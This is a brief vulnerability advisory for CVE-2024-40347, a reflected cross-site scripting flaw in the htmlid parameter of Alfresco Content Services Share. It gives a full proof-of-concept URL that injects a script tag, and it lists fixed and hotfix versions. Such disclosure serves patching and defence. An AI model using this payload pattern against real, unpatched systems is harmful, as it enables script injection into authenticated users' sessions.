CVE-2024-40347


Vulnerability: Reflected XSS

Note: The version and user below are the what was used. Other users and versions may be affected.

Requirements: It is likely the URL will not work unless you replace the GUID following the spacestore with one created in your test environment.

Version: 23.2.1-r96

Authenticated: Yes

User: Admin (possibly others)

Vulnerable Parameter: htmlid


https://192.168.1.102/share/service/components/folder-details/folder-metadata?nodeRef=workspace://SpacesStore/32a28673-6bbf-46b2-b533-e6220a94acf0&htmlid=template_x002e_folder-metadata_x002e_folder-details_x0023_default%22%3e%3cscript%3ealert(1)%3c%2fscript%3e


Fix will be in release of ACS 23.3 scheduled for August 2024. The following Hotfixes are also available for all supported versions of ACS:
ACS 7.2.2.1, ACS 7.3.2.1, ACS 7.4.2.1 and ACS 23.2.2
Please contact Hyland Support for more information.


Demo:

![](https://github.com/4rdr/proofs/blob/main/gifs/Alfresco_Reflected_XSS_via_htmlid_parameter.gif?raw=true)
